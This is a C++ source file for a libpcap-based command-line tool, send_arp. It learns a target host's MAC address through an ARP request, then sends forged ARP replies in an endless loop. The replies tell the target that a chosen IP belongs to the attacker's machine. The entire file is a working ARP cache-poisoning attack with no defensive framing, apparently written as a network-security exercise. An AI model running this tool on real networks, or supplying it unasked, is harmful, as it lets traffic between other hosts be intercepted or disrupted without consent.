#include <pcap.h>
#include <cstdio>
#include <stdint.h>
#include <stdlib.h>
#include <net/if.h>
#include <sys/ioctl.h>
#include <unistd.h>
#include <sys/socket.h>
#include <netinet/ether.h>
#include <cstring>

#define REQUEST 1
#define REPLY 2
#define RARP_REQ 3
#define RARP_REP 4
#define ARP 0x0806
#define ETH 1
#define IPV4 0x0800

typedef struct eth_header {
    uint8_t dst_mac[6];
    uint8_t src_mac[6];
    uint16_t type;
} eth_header;

typedef struct arp {
    eth_header eth;
    uint16_t h_type;
    uint16_t p_type;
    uint8_t h_size;
    uint8_t p_size;
    uint16_t opcode;
    uint8_t sender_mac[6];
    uint8_t sender_ip[4];
    uint8_t target_mac[6];
    uint8_t target_ip[4];
    uint8_t padding[12];
} arp;

void usage() {
    printf("syntax: send_arp <interface> <sender ip> <target ip>\n");
    printf("sample: send_arp ens33 192.168.0.15 192.168.0.178\n");
}

void insert_ip(uint8_t *dst, char*src) {
    int i, j;
    char *src_ip = src;
    for (i = 0;i < 4; ++i){
	for (j = 0; src_ip[j] != '.' && src_ip[j] != '\0'; ++j);	
	dst[i] = atoi(src_ip);
	src_ip = &src_ip[j + 1];
    }
}

uint16_t my_ntohs(uint16_t num) {
        return ((num & 0xff00) >> 8) + ((num & 0xff) << 8);
}

void init_arp(arp* packet) {
    packet->eth.type = my_ntohs(ARP);
    packet->h_type = my_ntohs(ETH);
    packet->p_type = my_ntohs(IPV4);
    packet->h_size = 6;
    packet->p_size = 4;
}

int get_mac(uint8_t *);

int main (int argc, char *argv[], char *envp[]) {
    pcap_t *fp;
    char errbuf[PCAP_ERRBUF_SIZE];
    char *iface = argv[1];
    char sender_ip[16] = {'\0', };
    char target_ip[16] = {'\0', };
    uint8_t my_mac[6];
    uint8_t is_target;
    int i;
    struct pcap_pkthdr* header;
    const uint8_t *data;
    arp* packet;
    arp *send;
    arp *spoofing;

    if(argc != 4) {
	usage();
	return -1;
    }

    strncpy(sender_ip, argv[2], 15);
    strncpy(target_ip, argv[3], 15);

    send = (arp*)malloc(sizeof(arp));
    spoofing = (arp*)malloc(sizeof(arp));

    setvbuf(stdout, 0LL, 1, 0LL);    
    setvbuf(stderr, 0LL, 1, 0LL); 

    fp = pcap_open_live(iface, BUFSIZ, 1, 1000, errbuf);
    
    if (fp == NULL) {
	fprintf(stderr, "couldn't open device %s: %s\n", iface, errbuf);
	return -1;
    }
    
    get_mac(my_mac);

    for(i = 0; i < 6; ++i) {
	send->eth.dst_mac[i] = 0xff; //broadcast
	send->eth.src_mac[i] = my_mac[i];
	send->sender_mac[i] = 0;
	send->target_mac[i] = my_mac[i];
    }

    init_arp(send);
    send->opcode = my_ntohs(REQUEST);
    insert_ip(send->sender_ip, sender_ip);
    insert_ip(send->target_ip, target_ip);
    
    while (true) {
	pcap_sendpacket(fp, (u_char *)send, sizeof(arp));
	int res = pcap_next_ex(fp, &header, &data);
	
	if (res == -1 || res == -2) break;
	if (!data) continue;
	
	packet = (arp*)data;
	if(my_ntohs(packet->eth.type)==ARP) {
	    if(my_ntohs(packet->opcode)==REPLY) {
		is_target = true;
		for(i = 0;i < 4; ++i) {
		    if(packet->sender_ip[i] != send->target_ip[i]) {
			is_target = false;
			break;
		    }

		    if(packet->target_ip[i] != send->sender_ip[i]) {
			is_target = false;
			break;
		    }
		}
		if(is_target) break;
	    }
	}
    }
    init_arp(spoofing);
    spoofing->opcode = my_ntohs(REPLY);
    for(i = 0; i < 6; ++i) {
	spoofing->eth.src_mac[i] = my_mac[i];
	spoofing->eth.dst_mac[i] = packet->sender_mac[i];
	spoofing->sender_mac[i] = my_mac[i];
	spoofing->target_mac[i] = packet->sender_mac[i];
    }
    insert_ip(spoofing->sender_ip, sender_ip);
    insert_ip(spoofing->target_ip, target_ip);
    while(true) {
	pcap_sendpacket(fp, (u_char*)spoofing, sizeof(arp));
	sleep(1);
	puts("ARP SPOOFING....");
    }
}

int get_mac(uint8_t *dst) {

    int nSD; // Socket descriptor
    struct ifreq *ifr; // Interface request
    struct ifconf ifc;
    int i, numif;
    struct ifreq *r;
    struct sockaddr_in *sin;
    memset(&ifc, 0, sizeof(struct ifconf));
    ifc.ifc_ifcu.ifcu_req = NULL;
    ifc.ifc_len = 0;

    // Create a socket that we can use for all of our ioctls
    nSD = socket( PF_INET, SOCK_DGRAM, 0 );
    
    if ( nSD < 0 )  return 0;
    
    if(ioctl(nSD, SIOCGIFCONF, &ifc) < 0) return 0;
    
    if ((ifr = (ifreq*)  malloc(ifc.ifc_len)) == NULL) {
	return 0;
    }

    else {
	ifc.ifc_ifcu.ifcu_req = ifr;

	if (ioctl(nSD, SIOCGIFCONF, &ifc) < 0) {
	    return 0;
	}
	numif = ifc.ifc_len / sizeof(struct ifreq);
	
	for (i = 0; i < numif; i++) {
	    r = &ifr[i];
	    sin = (struct sockaddr_in *)&r->ifr_addr;
	
	    if (!strcmp(r->ifr_name, "lo"))
		continue; // skip loopback interface
 
	    if(ioctl(nSD, SIOCGIFHWADDR, r) < 0) 
		return 0;
	    
	    memcpy(dst,	r->ifr_hwaddr.sa_data, 6);
	    return 0;
	}
    }
    close(nSD);
    free(ifr);
 
    return( 1 );
}

